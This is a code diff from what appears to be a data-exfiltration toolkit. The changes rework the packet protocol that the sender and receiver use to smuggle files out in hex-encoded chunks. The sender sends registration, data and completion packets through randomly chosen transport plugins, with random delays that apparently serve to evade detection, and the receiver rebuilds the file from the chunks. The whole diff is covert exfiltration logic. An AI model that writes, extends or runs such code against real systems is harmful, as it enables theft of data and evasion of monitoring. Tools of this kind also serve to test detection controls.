@@ -153,7 +153,7 @@ class Exfiltration(object):
                     continue
                 mod = importlib.import_module(f"det.plugins.{fname}")
                 mod.Plugin(self, config["plugins"][fname])
-        info(f"Loaded {len(self.plugins)} plugins")
+        info(f"{len(self.plugins)} plugins loaded")
 
     def should_use_plugin(self, plugin_name):
         # if the plugin has been specified specifically (-p twitter)
@@ -202,12 +202,12 @@ class Exfiltration(object):
 
     def register_file(self, message):
         global files
-        jobid = message[0].split('|')[0]
-        proto = message[0].split('|')[1]
+        jobid = message[0]
+        proto = message[1]
         if jobid not in files:
             f = {}
-            f['checksum'] = message[3].lower()
-            f['filename'] = message[1].lower()
+            f['checksum'] = message[4].lower()
+            f['filename'] = f"{message[2]}_{proto}"
             f['data'] = {}
             f['packets_len'] = -1
             files[jobid] = f
@@ -269,20 +269,20 @@ class Exfiltration(object):
             if (message.count("|!|") >= 2):
                 rcvd_bytes=len(message)
                 message = message.split("|!|")
-                jobid = message[0].split('|')[0]
-                proto = message[0].split('|')[1]
+                jobid = message[0]
+                proto = message[1]
                 info(f"[{proto}][{jobid}] Received {rcvd_bytes} bytes")
 
                 # register packet
-                if (message[2] == "REGISTER"):
+                if (message[3] == "REGISTER"):
                     self.register_file(message)
                 # done packet
-                elif (message[2] == "DONE"):
+                elif (message[3] == "DONE"):
                     if jobid not in files:
                         warning(f"[{proto}][{jobid}][!] received DONE packet for unknown JOBID! Storing as pending.")
                         self.store_pending_data(jobid, data)
                         return
-                    files[jobid]['packets_len'] = int(message[1])
+                    files[jobid]['packets_len'] = int(message[2])
                     #Check if all packets have arrived
                     if files[jobid]['packets_len'] == len(files[jobid]['data']):
                         ok(f"[{proto}][{jobid}][!] DONE packet received")
@@ -291,11 +291,11 @@ class Exfiltration(object):
                         warning(f"[{proto}][{jobid}][!] Received the last packet, but some are still missing. Waiting for the rest...")
                 # data packet
                 else:
-                    packet_nr = int(message[1])
+                    packet_nr = int(message[2])
                     # making sure there's a jobid for this file
                     if (jobid in files and packet_nr not in files[jobid]['data']):
                         info(f"[{proto}][{jobid}] DATA packet #{packet_nr} received")
-                        files[jobid]['data'][packet_nr] = ''.join(message[2:])
+                        files[jobid]['data'][packet_nr] = ''.join(message[3:])
                         #In case this packet was the last missing one
                         if files[jobid]['packets_len'] == len(files[jobid]['data']):
                             warning(f"[{proto}][{jobid}] last DATA packet received, reconstructing file")
@@ -324,6 +324,13 @@ class ExfiltrateFile(threading.Thread):
         self.plugin_name = plugin_name
 
     def run(self):
+        def get_plugin():
+            if not self.plugin_name:
+                plugin_name, plugin_send_function = self.exfiltrate.get_random_plugin()
+            else:
+                plugin_name = self.plugin_name
+                plugin_send_function = self.exfiltrate.get_plugins()[plugin_name]['send']
+            return (plugin_name, plugin_send_function)
         # checksum
         if self.file_to_send == 'stdin':
             file_content = sys.stdin.read()
@@ -337,16 +344,11 @@ class ExfiltrateFile(threading.Thread):
         self.checksum = md5(buf)
         del file_content
         # registering packet
-        if not self.plugin_name:
-            plugin_name, plugin_send_function = self.exfiltrate.get_random_plugin()
-        else:
-            plugin_name = self.plugin_name
-            plugin_send_function = self.exfiltrate.get_plugins()[plugin_name]['send']
+        plugin_name, plugin_send_function = get_plugin()
         ok("Using {0} as transport method".format(plugin_name))
-
         warning("[!] Registering packet for the file")
-        data = "%s|%s|!|%s.%s|!|REGISTER|!|%s" % (
-            self.jobid, plugin_name, os.path.basename(self.file_to_send), plugin_name, self.checksum)
+        data = "%s|!|%s|!|%s|!|REGISTER|!|%s" % (
+            self.jobid, plugin_name, os.path.basename(self.file_to_send), self.checksum)
         plugin_send_function(data)
 
         time_to_sleep = randint(1, MAX_TIME_SLEEP)
@@ -367,11 +369,11 @@ class ExfiltrateFile(threading.Thread):
             data_file = hexlify(f.read(randint(MIN_BYTES_READ, MAX_BYTES_READ))).decode()
             if not data_file:
                 break
-            plugin_name, plugin_send_function = self.exfiltrate.get_random_plugin()
+            plugin_name, plugin_send_function = get_plugin()
             ok("Using {0} as transport method".format(plugin_name))
             # info("Sending %s bytes packet" % len(data_file))
 
-            data = "%s|!|%s|!|%s" % (self.jobid, packet_index, data_file)
+            data = "%s|!|%s|!|%s|!|%s" % (self.jobid, plugin_name, packet_index, data_file)
             plugin_send_function(data)
             packet_index += 1
 
@@ -380,9 +382,9 @@ class ExfiltrateFile(threading.Thread):
             time.sleep(time_to_sleep)
 
         # last packet
-        plugin_name, plugin_send_function = self.exfiltrate.get_random_plugin()
+        plugin_name, plugin_send_function = get_plugin()
         ok("Using {0} as transport method".format(plugin_name))
-        data = "%s|!|%s|!|DONE" % (self.jobid, packet_index)
+        data = "%s|!|%s|!|%s|!|DONE" % (self.jobid, plugin_name, packet_index)
         plugin_send_function(data)
         f.close()
         sys.exit(0)
